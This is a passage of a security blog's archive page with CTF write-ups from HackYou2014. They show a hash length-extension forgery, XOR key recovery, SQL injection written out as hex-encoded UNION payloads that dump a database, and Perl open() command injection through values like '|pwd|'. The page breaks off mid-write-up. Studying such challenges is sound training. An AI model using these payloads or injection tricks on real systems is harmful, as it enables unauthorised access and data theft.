

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>&lt;/pwntester&gt; - Page 6</title>
    <meta name="description" content="">

    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="shortcut icon" href="../../assets/favicon.png?v=d47df0f104">

    <link rel="stylesheet" type="text/css" href="../../assets/css/screen.css?v=d47df0f104">
    <link href="http://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet" type="text/css">
    <link href="http://fonts.googleapis.com/css?family=Roboto" rel="stylesheet" type="text/css">

    <script type="text/javascript" src="../../assets/js/jquery-1.11.1.min.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/jquery.fitvids.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/moment.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/handlebars.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/jquery.tapirus.js?v=d47df0f104"></script> 
    <script type="text/javascript" src="../../assets/js/index.js?v=d47df0f104"></script>


    <link rel="canonical" href="http://www.pwntester.com/page/6/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <link rel="prev" href="http://www.pwntester.com/page/5/">
    <link rel="next" href="http://www.pwntester.com/page/7/">
    <meta name="generator" content="Ghost 0.11">
    <link rel="alternate" type="application/rss+xml" title="&lt;/pwntester&gt;" href="http://www.pwntester.com/rss/">

    <link href="http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="../../assets/css/prism.css?v=d47df0f104">

    <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-49973078-2', 'pwntester.com');
  ga('send', 'pageview');

</script></head>

<body class="paged archive-template">

    <div id="sidebar">
        <div id="sidebar-content" class="inner">
            <a class="blog-logo" href="http://www.pwntester.com"><img src="../../content/images/2014/May/rooted.jpeg" alt="Blog Logo"></a>
            <h2 class="blog-title"><a href="http://www.pwntester.com">&lt;/pwntester&gt;</a>
            <h3 class="blog-description"></h3></h2>

            <!--form id="search">
                <input id="search-field" placeholder="Search"/>
            </form-->
            <form id="search">  
                <input id="search-field" type="search" placeholder="Search">
            </form>  

            <div id="sidebar-links">
                <ul id="subscription-links">
                    <li><a target="_blank" href="http://www.pwntester.com/rss/"><i class="fa fa-rss"></i> Subscribe via RSS</a></li>
                    <!-- No support yet
                    <li><a target="_blank" href=" "><i class="fa fa-envelope"></i> Subscribe via email<a></li>
                    -->
                </ul>
                <ul id="sidebar-internal">
                    <!-- For 'About' and other pages -->
                </ul>
                <ul id="sidebar-external">
                    <li class="external-link"><a href="https://github.com/pwntester"><i class="fa fa-github"></i> GitHub</a></li>
<li class="external-link"><a href="http://www.linkedin.com/in/alvaroms"><i class="fa fa-linkedin"></i> LinkedIn</a></li>
<li class="external-link"><a href="https://twitter.com/pwntester"><i class="fa fa-twitter"></i> Twitter</a></li>
<li class="external-link"><a target="_blank" href="mailto:alvaro@pwntester.com"><i class="fa fa-envelope"></i> Contact</a></li>
                </ul>
            </div>

            <footer class="site-footer">
                <section class="copyright">© 2017 <a href="mailto:alvaro@pwntester.com">Alvaro Muñoz</a> • All rights reserved.</section>
            </footer>
        </div>
    </div>

    <main>
        <section id="results"></section>
        


<article class="post tag-ctf tag-hackyou201458 tag-crypto">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-01-16">16 Jan 2014</time> on <a href="../../tag/ctf/">CTF</a>, <a href="../../tag/hackyou201458/">HackYou2014</a>, <a href="../../tag/crypto/">Crypto</a></span>
        <h1 class="post-title"><a href="../../blog/2014/01/16/hackyou2014-crypto200-write-up/">#hackyou2014 Crypto200 write-up</a></h1>
    </header>
    <section class="post-content">
        <p>In this <a href="http://hackyou.ctf.su/tasks/crypto200">level</a> we are said that our challange is login with administrator role in a service listening on hackyou2014tasks.ctf.su 7777 <br>
We are given the following source code:</p>

<pre><code class="language-lang-python line-numbers ">#!/usr/bin/python
from math import sin  
from urlparse import parse_qs  
from base64 import b64encode  
from base64 import b64decode  
from re import match

SALT = ''  
USERS = set()  
KEY = ''.decode('hex')

def xor(a, b):  
    return ''.join(map(lambda x : chr(ord(x[0]) ^ ord(x[1])), zip(a, b * 100)))

def hashme(s):  
    #my secure hash function
    def F(X,Y,Z):
        return ((~X &amp; Z) | (~X &amp; Z)) &amp; 0xFFFFFFFF
    def G(X,Y,Z):
        return ((X &amp; Z) | (~Z &amp; Y)) &amp; 0xFFFFFFFF
    def H(X,Y,Z):
        return (X ^ Y ^ Y) &amp; 0xFFFFFFFF
    def I(X,Y,Z):
        return (Y ^ (~Z | X)) &amp; 0xFFFFFFFF
    def ROL(X,Y):
        return (X &lt;&lt; Y | X &gt;&gt; (32 - Y)) &amp; 0xFFFFFFFF

    A = 0x67452301
    B = 0xEFCDAB89
    C = 0x98BADCFE
    D = 0x10325476
    X = [int(0xFFFFFFFF * sin(i)) &amp; 0xFFFFFFFF for i in xrange(256)]

    for i,ch in enumerate(s):
        k, l = ord(ch), i &amp; 0x1f
        A = (B + ROL(A + F(B,C,D) + X[k], l)) &amp; 0xFFFFFFFF
        B = (C + ROL(B + G(C,D,A) + X[k], l)) &amp; 0xFFFFFFFF
        C = (D + ROL(C + H(D,A,B) + X[k], l)) &amp; 0xFFFFFFFF
        D = (A + ROL(D + I(A,B,C) + X[k], l)) &amp; 0xFFFFFFFF

    return ''.join(map(lambda x : hex(x)[2:].strip('L').rjust(8, '0'), [B, A, D, C]))

def gen_cert(login):  
    global SALT, KEY
    s = 'login=%s&amp;role=anonymous' % login
    s += hashme(SALT + s)
    print("decrypted cert: %s" % s)
    s = b64encode(xor(s, KEY))
    print("encrypted cert: %s" % s)
    return s

def register():  
    global USERS
    login = raw_input('Your login: ').strip()
    if not match('^[\w]+$', login):
        print '[-] Wrong login'
        return
    if login in USERS:
        print '[-] Username already exists'
    else:
        USERS.add(login)
        print '[+] OK\nYour auth certificate:\n%s' % gen_cert(login)

def auth():  
    global SALT, KEY
    cert = raw_input('Provide your certificate:\n').strip()
    try:
        cert = xor(b64decode(cert), KEY)
        print cert
        auth_str, hashsum = cert[0:-32], cert[-32:]
        print auth_str
        print hashsum
        if hashme(SALT + auth_str) == hashsum:
            data = parse_qs(auth_str, strict_parsing = True)
            print '[+] Welcome, %s!' % data['login'][0]
            if 'administrator' in data['role']:
                flag = open('flag.txt').readline()
                print flag
        else:
            print '[-] Auth failed'
    except:
        print '[-] Error'


def start():  
    while True:
        print '======================'
        print '[0] Register'
        print '[1] Login'
        print '======================'
        num = raw_input().strip()
        if num == '0':
            register()
        elif num == '1':
            auth()

start()  
</code></pre>

<p>The service generates certificate when you register that you need to present in order to login in. <br>
The certificate is a XOR encrypted version of the following string:</p>

<pre><code class="language-lang-bash line-numbers ">login=&lt;login&gt;&amp;role=anonymous&lt;salted hash of login+role string&gt;  
</code></pre>

<p>The problem is that we dont know the encryption key nor the hash salt. So let's take it one step at a time:</p>

<h2 id="gettingthekeytothekingdom">Getting the key to the kingdom</h2>

<p>Getting the key was the easy part as the cert is encrypted in an ECB way, we only need to send a login name long enough so that the whole key is xored with our know long login name, so we register the user:</p>

<pre><code class="language-lang-bash line-numbers ">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
</code></pre>

<p>And get the cert:</p>

<pre><code class="language-lang-bash line-numbers ">RK5yZMJaRRl8LVBk5mx9xmVfPhXWqPlNObWPakmd6mpMs0qh6p9KVhBr0hqGJCE9tKRpgFRM7SZFGXwtUGTmbH3GZV8+Fdao+U05tY9qSZ3qakyzSqHqn0pWEGvSGoYkIT20pGmAVEztJkUZfC1QZOZsfcZlXz4V1qj5TTm1j2pJnepqTLNKoeqfSlYQa9IahiQhPbSkaYBUTO0mRRl8LVBk5mx9xmVfPhXWqPlNObWPakmd6mpMs0qh6p9KVhBr0hqGJCE9tKRpgFRM7SZFGXwtUGTmbH3GZV8+Fdao+U05tY9qSZ3qakyzSqHqn0pWEGvSGoYkIT20pA6zemHJWmU2UgJoSMhYT7cXe0kyoN7cakrNq0lu7MgSaJYz0p/rb3NpE6FqpgZQ  
</code></pre>

<p>Now if we xor the two together (adding "login=" before the login name) we get the key and since our login name was long enough we can extract the key that is repeated several times:</p>

<pre><code class="language-lang-bash line-numbers ">28c1150dac6704583d6c1125a72d3c87241e7f5497e9b80c78f4ce2b08dcab2b0df20be0abde0b17512a935bc765607cf5e5  
</code></pre>

<p>Now we can decrypt our cert and extrack the login string and hashsum:</p>

<pre><code class="language-lang-bash line-numbers ">[+] Credentials: login=pwntester&amp;role=anonymous
[+] Hashsum: 3e4d482fd5ce578af79312466b50b8f6
</code></pre>

<h2 id="puttingsomesalt">Putting some salt</h2>

<p>Our goal is to submit an "administrator" version of the string so we need to know the <strong>salt</strong> in order to produce the right hash that is going to be checked in the server ... or not? <br>
Well, actually, the hashing function is not reversible and no collisions are found easy, but there is still hope in the way of <a href="http://en.wikipedia.org/wiki/Length_extension_attack">Length extension attacks</a>. Actually is even simpler since we dont have to care about the padding! <br>
Ok, so here is the idea.</p>

<ul>
<li>The Hashing state machine starts in a initial state (that we know, check A,B,C,D in the hashme function)</li>
<li>The hashing machine iterates over all the characters (abcd) and ends in a different state that is returned as the hashsum</li>
<li>If we extend the original characters (abcd1234) and pass it to the hash function, we can do two things:
<ul><li>Start from scratch, reset the hash FSM, and calculate process it till there are no more characters and we return the last state in the form of a hashsum</li>
<li>Since we already hashed some characters and know the machine state, we can modify the hash FSM so its initial state is the one returned when we hashed (abcd) and then just continue from that state with the new characters (1234) until there are no more characters and we return the state in the form of a hashsum</li></ul></li>
</ul>

<p>Well, the server is going to do the first approach, but we can do the second without knowing the Salt!! So we know that "login=pwntester&amp;role=anonymous" hash is 3e4d482fd5ce578af79312466b50b8f6.</p>

<p>Lets say we want to calculate the hash of "login=pwntester&amp;role=anonymousNEWSTUFFHERE", we can reset the Hash machine so its initial state is 3e4d482fd5ce578af79312466b50b8f6 and then just hash the "NEWSTUFFHERE", the result will be the same hash as hashing the whole string.</p>

<p>Now, if we focus on the auth() method:</p>

<pre><code class="language-lang-python line-numbers ">def auth():  
    global SALT, KEY
    cert = raw_input('Provide your certificate:\n').strip()
    try:
        cert = xor(b64decode(cert), KEY)
        print cert
        auth_str, hashsum = cert[0:-32], cert[-32:]
        print auth_str
        print hashsum
        if hashme(SALT + auth_str) == hashsum:
            data = parse_qs(auth_str, strict_parsing = True)
            print '[+] Welcome, %s!' % data['login'][0]
            if 'administrator' in data['role']:
                flag = open('flag.txt').readline()
                print flag
        else:
            print '[-] Auth failed'
    except:
        print '[-] Error'
</code></pre>

<p>We can see that the auth string is parsed as a query string (parse_qs) so if we pass different parameters with the same name, they will be treated as an array. <br>
Then the "if 'administrator' in data['role']" will pass if one of them is <strong>administrator</strong></p>

<p>So now we know what we need to hash:</p>

<pre><code class="language-lang-bash line-numbers ">login=pwntester&amp;role=anonymous&amp;role=administrator  
</code></pre>

<p>This is the function I wrote to hash from a given state:</p>

<pre><code class="language-lang-python line-numbers ">def hashmeFromState(s,hash,init):  
    #my secure hash function
    def F(X,Y,Z):
        return ((~X &amp; Z) | (~X &amp; Z)) &amp; 0xFFFFFFFF
    def G(X,Y,Z):
        return ((X &amp; Z) | (~Z &amp; Y)) &amp; 0xFFFFFFFF
    def H(X,Y,Z):
        return (X ^ Y ^ Y) &amp; 0xFFFFFFFF
    def I(X,Y,Z):
        return (Y ^ (~Z | X)) &amp; 0xFFFFFFFF
    def ROL(X,Y):
        return (X &lt;&lt; Y | X &gt;&gt; (32 - Y)) &amp; 0xFFFFFFFF


    B = int(hash[0:8], 16)
    A = int(hash[8:16], 16)
    D = int(hash[16:24], 16)
    C = int(hash[24:32], 16)

    X = [int(0xFFFFFFFF * sin(i)) &amp; 0xFFFFFFFF for i in xrange(256)]

    i = init
    for j,ch in enumerate(s):
        # We add the length of the previous state (we dont know secret length so we have to brute force it) to restaurate the state
        k, l = ord(ch), i &amp; 0x1f
        if j==0:
            print("hashmeext pos:{0} char:{1} l:{2}".format(j,ch,l))
        A = (B + ROL(A + F(B,C,D) + X[k], l)) &amp; 0xFFFFFFFF
        B = (C + ROL(B + G(C,D,A) + X[k], l)) &amp; 0xFFFFFFFF
        C = (D + ROL(C + H(D,A,B) + X[k], l)) &amp; 0xFFFFFFFF
        D = (A + ROL(D + I(A,B,C) + X[k], l)) &amp; 0xFFFFFFFF
        i += 1

    return ''.join(map(lambda x : hex(x)[2:].strip('L').rjust(8, '0'), [B, A, D, C]))
</code></pre>

<p>Note that we dont know the length of the Salt, so we need to brute force it to initialize the hash FST in the right state. After running the script against the live service, we get that the right length is 18:</p>

<pre><code class="language-lang-bash line-numbers ">alvaro@winterfell ~/D/h/crypto200&gt; python crack.py  
[+] Concatenated key (250 bytes): 28c1150dac6704583d6c1125a72d3c87241e7f5497e9b80c78f4ce2b08dcab2b0df20be0abde0b17512a935bc765607cf5e528c1150dac6704583d6c1125a72d3c87241e7f5497e9b80c78f4ce2b08dcab2b0df20be0abde0b17512a935bc765607cf5e528c1150dac6704583d6c1125a72d3c87241e7f5497e9b80c78f4ce2b08dcab2b0df20be0abde0b17512a935bc765607cf5e528c1150dac6704583d6c1125a72d3c87241e7f5497e9b80c78f4ce2b08dcab2b0df20be0abde0b17512a935bc765607cf5e528c1150dac6704583d6c1125a72d3c87241e7f5497e9b80c78f4ce2b08dcab2b0df20be0abde0b17512a935bc765607cf5e5
[+] Key: 28c1150dac6704583d6c1125a72d3c87241e7f5497e9b80c78f4ce2b08dcab2b0df20be0abde0b17512a935bc765607cf5e5
[+] Credentials: login=pwntester&amp;role=anonymous
[+] Hashsum: 3e4d482fd5ce578af79312466b50b8f6
[+] User Credentials: login=pwntester&amp;role=anonymous3e4d482fd5ce578af79312466b50b8f6
[+] User Cert: RK5yZMJadC9TGHRW00hOoVZxEzGqiNZjFo2jRH2vmE45lj/YmbhvIjJPpmz/BAZLzNYZ8yE7mgUxaF9UdxM=
[-] Auth failed
hashmeext pos:0 char:&amp; l:1  
[+] Admin Credentials (secret length=1: login=pwntester&amp;role=anonymous&amp;role=administrator72d2e3d8de7b390f146cc6b5e8552ea8)
[+] Admin Cert (secret length=1: RK5yZMJadC9TGHRW00hOoVZxEzGqiNZjFo2jRH2vjVlinm7dyrpmfj9D4C+1BBQTh9IapSdonwM8PFhbcxaeHVq2ECgcN6GLjWlAwfsZbb2T)
[+] Admin Cert decoded (secret length=1: login=pwntester&amp;role=anonymous&amp;role=administrator72d2e3d8de7b390f146cc6b5e8552ea8)

...
...
...

[-] Auth failed
hashmeext pos:0 char:&amp; l:18  
[+] Admin Credentials (secret length=18: login=pwntester&amp;role=anonymous&amp;role=administrator6ca059630c51cb32e3d791aeca560eae)
[+] Admin Cert (secret length=18: RK5yZMJadC9TGHRW00hOoVZxEzGqiNZjFo2jRH2vjVlinm7dyrpmfj9D4C+1BBQTh9NLoCU4lVE3aF5ZIEbFHg7iF3pIbaaI3W8Zwfgbbb3O)
[+] Admin Cert decoded (secret length=18: login=pwntester&amp;role=anonymous&amp;role=administrator6ca059630c51cb32e3d791aeca560eae)

[+] Welcome
Eureka!!  
</code></pre>

<p>Now we can use the cert to login and get the flag:</p>

<pre><code class="language-lang-bash line-numbers ">RK5yZMJadC9TGHRW00hOoVZxEzGqiNZjFo2jRH2vjVlinm7dyrpmfj9D4C+1BBQTh9NLoCU4lVE3aF5ZIEbFHg7iF3pIbaaI3W8Zwfgbbb3O  
</code></pre>

<pre><code class="language-lang-bash line-numbers ">alvaro@winterfell ~/D/h/crypto200&gt; nc hackyou2014tasks.ctf.su 7777                                                                                                                                                                                                            1  
======================
[0] Register
[1] Login
======================
1  
Provide your certificate:  
RK5yZMJadC9TGHRW00hOoVZxEzGqiNZjFo2jRH2vjVlinm7dyrpmfj9D4C+1BBQTh9NLoCU4lVE3aF5ZIEbFHg7iF3pIbaaI3W8Zwfgbbb3O  
[+] Welcome, pwntester!
CTF{40712b12d4be002e20f51424309a068c}  
</code></pre>
    </section>
    <footer class="post-indexfooter">
        <i class="fa fa-comments"></i> <a href="../../blog/2014/01/16/hackyou2014-crypto200-write-up/index.html#disqus_thread">Comments</a>
    </footer>
</article>


<article class="post tag-ctf tag-hackyou201458 tag-crypto">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-01-16">16 Jan 2014</time> on <a href="../../tag/ctf/">CTF</a>, <a href="../../tag/hackyou201458/">HackYou2014</a>, <a href="../../tag/crypto/">Crypto</a></span>
        <h1 class="post-title"><a href="../../blog/2014/01/16/hackyou2014-crypto100-write-up/">#hackyou2014 Crypto100 write-up</a></h1>
    </header>
    <section class="post-content">
        <p>In this <a href="http://hackyou.ctf.su/tasks/crypto100">level</a> we are asked to break a code and decrypt <a href="http://hackyou.ctf.su/files/crypto100.zip">msg002.enc</a>. We are given the encryptor code without the key:</p>

<pre><code class="language-lang-clike line-numbers ">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(int argc, char **argv) {  
    if (argc != 3) {
        printf("USAGE: %s INPUT OUTPUT\n", argv[0]);
        return 0;
    }
    FILE* input  = fopen(argv[1], "rb");
    FILE* output = fopen(argv[2], "wb");
    if (!input || !output) {
        printf("Error\n");
        return 0;
    }
    char k[] = "CENSORED";
    char c, p, t = 0;
    int i = 0;
    while ((p = fgetc(input)) != EOF) {
        c = (p + (k[i % strlen(k)] ^ t) + i*i) &amp; 0xff;
        t = p;
        i++;
        fputc(c, output);
    }
    return 0;
}
</code></pre>

<p>And we are also given a plaintext (msg001) and its corresponding cryptotext (msg001.enc) so we can easily extract the key with something like:</p>

<pre><code class="language-lang-clike line-numbers ">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(int argc, char **argv) {  
    if (argc != 2) {
        printf("USAGE: %s CRYPTO \n", argv[0]);
        return 0;
    }
    FILE* input  = fopen(argv[1], "rb");
    if (!input) {
        printf("Error\n");
        return 0;
    }

    char c, p, t = 0;
    int i = 0;

    // We use the following loop to get the key knowing the cryptotext(input) and plaintaext(w[])
    char w[] = "Hi! This is only test message";
    unsigned int j = 0;
    while ((p = fgetc(input)) != 0) {
        // printf("read %d", p);
        for (j=31;j&lt;125;j++) {
            c = (p - (j ^ t) - i*i) &amp; 0xff;
            if (c == w[i]) {
                printf("%c\n",j);
                t = c;
                i++;
                break;
            }
        }
    }
    return 0;
}
</code></pre>

<p>The resulting key is: <strong>VeryLongKeyYouWillNeverGuess</strong> <br>
Now we can use a decryptor to extract msg002:</p>

<pre><code class="language-lang-clike line-numbers "> #include &lt;stdlib.h&gt;
 #include &lt;stdio.h&gt;
 #include &lt;string.h&gt;

 int main(int argc, char **argv) {
    if (argc != 3) {
         printf("USAGE: %s INPUT OUTPUT\n", argv[0]);
         return 0;
     }
     FILE* input  = fopen(argv[1], "rb");
     FILE* output = fopen(argv[2], "wb");
     if (!input || !output) {
         printf("Error\n");
         return 0;
     }


     char c, p, t = 0;
     int i = 0;

    char k[] = "VeryLongKeyYouWillNeverGuess";
    i = 0;
    c, p, t = 0;
    int g = 0;
    while ((p = fgetc(input)) != 1) {
        c = (p - (k[i % strlen(k)] ^ t) - i*i) &amp; 0xff;
         printf("Decrypting %x i=%d t=%d k=%d -&gt; %d\n",p,i,t,(k[i % strlen(k)] ^ t),c);
        t = c;
        i++;
         //printf("%c",c);
         fputc(c, output);
         g++;
         if (g&gt;450) {break;}
    }

    return 0;
 }
</code></pre>

<p>And the results are:</p>

<blockquote>
  <p>The known-plaintext attack (KPA) is an attack model for cryptanalysis where the attacker has samples of both the plaintext (called a crib), and its encrypted version (ciphertext). These can be used to reveal further secret information such as secret keys and code books. The term "crib" originated at Bletchley Park, the British World War II decryption operation.
  The flag is CTF{6d5eba48508efb13dc87220879306619}</p>
</blockquote>
    </section>
    <footer class="post-indexfooter">
        <i class="fa fa-comments"></i> <a href="../../blog/2014/01/16/hackyou2014-crypto100-write-up/index.html#disqus_thread">Comments</a>
    </footer>
</article>


<article class="post tag-ctf tag-php tag-hackyou201458">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-01-16">16 Jan 2014</time> on <a href="../../tag/ctf/">CTF</a>, <a href="../../tag/php/">PHP</a>, <a href="../../tag/hackyou201458/">HackYou2014</a></span>
        <h1 class="post-title"><a href="../../blog/2014/01/16/hackyou2014-web100-write-up/">#hackyou2014 Web100 write-up</a></h1>
    </header>
    <section class="post-content">
        <p>In this <a href="http://hackyou2014tasks.ctf.su:10080/">level</a> we are presented with some logos we can vote.</p>

<p><img src="../../content/images/octopress/web100-1.png" alt=""></p>

<p>If we look at the source code we can see an interesting comment:</p>

<pre><code class="language-lang-html line-numbers ">...
&lt;!-- TODO: remove index.phps --&gt;  
...
</code></pre>

<p>We can grab the source code:</p>

<pre><code class="language-lang-php line-numbers "> &lt;?php
include 'db.php';  
session_start();  
if (!isset($_SESSION['login'])) {  
    $_SESSION['login'] = 'guest'.mt_rand(1e5, 1e6);
}
$login = $_SESSION['login'];

if (isset($_POST['submit'])) {  
    if (!isset($_POST['id'], $_POST['vote']) || !is_numeric($_POST['id']))
        die('Hacking attempt!');
    $id = $_POST['id'];
    $vote = (int)$_POST['vote'];
    if ($vote &gt; 5 || $vote &lt; 1)
        $vote = 1;
    $q = mysql_query("INSERT INTO vote VALUES ({$id}, {$vote}, '{$login}')");
    $q = mysql_query("SELECT id FROM vote WHERE user = '{$login}' GROUP BY id");
    echo '&lt;p&gt;&lt;b&gt;Thank you!&lt;/b&gt; Results:&lt;/p&gt;';
    echo '&lt;table border="1"&gt;';
    echo '&lt;tr&gt;&lt;th&gt;Logo&lt;/th&gt;&lt;th&gt;Total votes&lt;/th&gt;&lt;th&gt;Average&lt;/th&gt;&lt;/tr&gt;';
    while ($r = mysql_fetch_array($q)) {
        $arr = mysql_fetch_array(mysql_query("SELECT title FROM picture WHERE id = ".$r['id']));
        echo '&lt;tr&gt;&lt;td&gt;'.$arr[0].'&lt;/td&gt;';
        $arr = mysql_fetch_array(mysql_query("SELECT COUNT(value), AVG(value) FROM vote WHERE id = ".$r['id']));
        echo '&lt;td&gt;'.$arr[0].'&lt;/td&gt;&lt;td&gt;'.round($arr[1],2).'&lt;/td&gt;&lt;/tr&gt;';
    }
    echo '&lt;/table&gt;';
    echo '&lt;br&gt;&lt;a href="index.php"&gt;Back&lt;/a&gt;&lt;br&gt;';
    exit;
}
&lt;html&gt;  
&lt;head&gt;  
    &lt;title&gt;Picture Gallery&lt;/title&gt;
&lt;/head&gt;  
&lt;body&gt;  
&lt;p&gt;Welcome, &lt;?php echo $login; ?&gt;&lt;/p&gt;  
&lt;p&gt;Help us to choose the best logo!&lt;/p&gt;  
&lt;form action="index.php" method="POST"&gt;  
&lt;table border="1" cellspacing="5"&gt;  
&lt;tr&gt;  
$q = mysql_query('SELECT * FROM picture');
while ($r = mysql_fetch_array($q)) {  
    echo '&lt;td&gt;&lt;img src="./images/'.$r['image'].'"&gt;&lt;div align="center"&gt;'.$r['title'].'&lt;br&gt;&lt;input type="radio" name="id" value="'.$r['id'].'"&gt;&lt;/div&gt;&lt;/td&gt;';
}
&lt;/tr&gt;  
&lt;/table&gt;  
&lt;p&gt;Your vote:  
&lt;select name="vote"&gt;  
&lt;option value="1"&gt;1&lt;/option&gt;  
&lt;option value="2"&gt;2&lt;/option&gt;  
&lt;option value="3"&gt;3&lt;/option&gt;  
&lt;option value="4"&gt;4&lt;/option&gt;  
&lt;option value="5"&gt;5&lt;/option&gt;  
&lt;/select&gt;&lt;/p&gt;  
&lt;input type="submit" name="submit" value="Submit"&gt;  
&lt;/form&gt;  
&lt;/body&gt;  
&lt;/html&gt;  
&lt;!-- TODO: remove index.phps --&gt;  
</code></pre>

<p>We cannot inject in <strong>vote</strong> because it is casted to an integer and the value is verified but we can inject in <strong>id</strong> if we can bypass the <strong>is_numeric</strong> function. Actually, it was quite easy, we can submit hexadecimal values and benefit from how <strong>mysql</strong> handles <a href="http://dev.mysql.com/doc/refman/5.0/en/hexadecimal-literals.html">hex literals</a>. <br>
We can verify the injection submiting:</p>

<pre><code class="language-lang-html line-numbers ">0x39393939393939393939393920756e696f6e20616c6c202873656c656374202748656c6c6f21212729  
999999999999 union all (select 'Hello!!')  
</code></pre>

<p>The server will return:</p>

<p><img src="../../content/images/octopress/web100-2.png" alt=""></p>

<p>Ok, now we can try something more interesting:</p>

<pre><code class="language-lang-html line-numbers ">0x39393939393939393939393920756e696f6e20616c6c202853454c4543542047524f55505f434f4e43415428736368656d615f6e616d65292046524f4d20696e666f726d6174696f6e5f736368656d612e736368656d61746129  
999999999999 union all (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)  
</code></pre>

<pre><code class="language-lang-html line-numbers ">information_schema,mysql,performance_schema,task,test  
</code></pre>

<p>From "task"</p>

<pre><code class="language-lang-html line-numbers ">0x39393939393939393939393920756e696f6e20616c6c202853454c4543542047524f55505f434f4e434154287461626c655f6e616d65292046524f4d20696e666f726d6174696f6e5f736368656d612e7461626c6573205748455245207461626c655f736368656d61203d20277461736b2729  
999999999999 union all (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = 'task')  
</code></pre>

<pre><code class="language-lang-html line-numbers ">Flag,picture,vote  
</code></pre>

<p>Now the columns:</p>

<pre><code class="language-lang-html line-numbers ">0x39393939393939393939393920756e696f6e20616c6c202853454c4543542047524f55505f434f4e43415428636f6c756d6e5f6e616d65292046524f4d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73205748455245207461626c655f736368656d61203d20277461736b2720616e64207461626c655f6e616d653d27466c61672729  
999999999999 union all (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema = 'task' and table_name='Flag')  
</code></pre>

<pre><code class="language-lang-html line-numbers ">flag  
</code></pre>

<p>And finally:</p>

<pre><code class="language-lang-html line-numbers ">0x39393939393939393939393920756e696f6e20616c6c202853454c4543542047524f55505f434f4e43415428666c6167292066726f6d20466c616729  
999999999999 union all (SELECT GROUP_CONCAT(flag) from Flag)  
</code></pre>

<pre><code class="language-lang-html line-numbers ">CTF{820178c33c03aaa7cfe644c691679cf8}  
</code></pre>
    </section>
    <footer class="post-indexfooter">
        <i class="fa fa-comments"></i> <a href="../../blog/2014/01/16/hackyou2014-web100-write-up/index.html#disqus_thread">Comments</a>
    </footer>
</article>


<article class="post tag-ctf tag-web tag-php tag-hackyou201458">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-01-15">15 Jan 2014</time> on <a href="../../tag/ctf/">CTF</a>, <a href="../../tag/web/">Web</a>, <a href="../../tag/php/">PHP</a>, <a href="../../tag/hackyou201458/">HackYou2014</a></span>
        <h1 class="post-title"><a href="../../blog/2014/01/15/hackyou2014-web200-write-up/">#hackyou2014 Web200 write-up</a></h1>
    </header>
    <section class="post-content">
        <p>In this <a href="http://hackyou2014tasks.ctf.su:20080/">level</a> we are presented with a typical Snake game.</p>

<p><img src="../../content/images/octopress/snake.png" alt=""></p>

<p>I spent a couple of hours deofuscating the javascript code until I was capable of submitting any score. Nice but useless. I also found out that I could fake the IP associated to the score using the <strong>X-Forwarded-For</strong> header. <br>
That was pretty much it until the CTF was about to finish when I was given the hint: "../". I could use it to locate a LFI vulnerability that was affecting the <strong>index.php?ip</strong> parameter so I was capable of reading <strong>index.pl</strong>:</p>

<p><img src="../../content/images/octopress/indexpl.png" alt=""></p>

<p>Reviewing the code we spot the LFI in line 4:</p>

<pre><code class="language-lang-bash line-numbers ">$login = $session-&gt;param('login');
print $req-&gt;p('Hello, '.$login.'!');  
if ($req-&gt;param('ip')) {  
    $file = './data/'.MD5($login)."/".$req-&gt;param('ip');
    if (-e $file) {
        open FILE, $file;
        $html = '';
        while (&lt;FILE&gt;) {
            $html .= $_;
        }
        close(FILE);
        print $req-&gt;start_table({border=&gt;1});
        print $req-&gt;Tr($req-&gt;th(['Date', 'Score']));
        print $html;
        print $req-&gt;end_table();
        print $req-&gt;a({href=&gt;'index.pl'}, 'Back');
    } else {
        print $req-&gt;h1('Error');
    }
}
</code></pre>

<p>But also there is another interesting "feature" if $file exists then it will be opened and since perl <strong>open()</strong> command in line 6 allow us to inject commands using pipes, we can execute any arbitrary command. Problem is that $file needs to exist so how can we create a random file there? Well, we can use our ability to submit random IPs with <strong>X-Forwarded-For</strong>:</p>

<p><img src="../../content/images/octopress/web200-1.png" alt=""></p>

<p>Now if we go to index.pl?ip=|pwd| we will get:</p>

<p><img src="../../content/images/octopress/web200-2.png" alt=""></p>

<p>Nice! However we cannot create files containing a slash ("/"):</p>

<pre><code class="language-lang-bash line-numbers ">fusion@fusion:~/test$ perl -e 'open(FILE, "&gt;&gt;", "./"."|pwd|")'  
fusion@fusion:~/test$ perl -e 'open(FILE, "&gt;&gt;", "./"."|ls .|")'  
